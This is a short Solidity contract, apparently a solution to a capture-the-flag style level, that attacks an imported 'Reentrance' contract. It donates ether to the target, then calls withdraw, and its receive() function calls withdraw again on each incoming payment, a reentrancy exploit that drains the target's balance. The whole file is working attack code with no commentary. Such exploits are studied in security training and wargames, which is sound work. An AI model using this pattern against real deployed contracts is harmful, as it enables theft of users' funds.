// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance reentrance;

    constructor(address _reentranceContractAddress) public {
        reentrance = Reentrance(payable(_reentranceContractAddress));
    }

    function sendDonation() public payable {
        reentrance.donate{value: msg.value}(address(this));
    }

    function attack(uint256 _amountToWithdraw) public {
        reentrance.withdraw(_amountToWithdraw);
    }

    receive() external payable {
        reentrance.withdraw(msg.value);
    }
}
